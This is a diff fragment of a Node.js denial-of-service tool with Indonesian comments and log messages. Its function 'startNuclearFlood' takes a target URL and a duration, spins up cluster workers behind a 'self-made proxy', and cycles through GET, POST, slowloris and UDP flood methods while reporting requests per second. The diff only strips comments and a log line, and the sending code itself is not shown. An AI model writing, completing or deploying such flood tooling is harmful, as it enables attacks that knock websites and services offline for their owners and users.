@@ -50,7 +50,7 @@ function startSelfMadeProxy() {
 }
 
 function startNuclearFlood(targetUrl, durationSeconds, statusCallback) {
-    if (cluster.isPrimary) { // Master process logic
+    if (cluster.isPrimary) {
         const selfMadeProxyUrl = startSelfMadeProxy();
 
         console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
@@ -71,7 +71,6 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) {
             secondsRemaining -= 5;
             if (secondsRemaining < 0) secondsRemaining = 0;
 
-            // Hitung RPS (Requests Per Second) selama interval 5 detik terakhir
             currentRps = Math.round((totalSent - lastTotalSent) / 5);
             lastTotalSent = totalSent;
 
@@ -90,7 +89,6 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) {
             }
         }, 5000);
 
-        // Batasi jumlah worker untuk menghemat memori di lingkungan terbatas seperti Railway.
         const numCPUs = 2;
         const attackMethods = ['get', 'post', 'slowloris', 'udp'];
         
@@ -122,7 +120,6 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) {
             }
         };
 
-        console.log("Master: Mengembalikan kontrol 'stop' ke pemanggil.");
         return { stop: stopAttack };
     }
 }
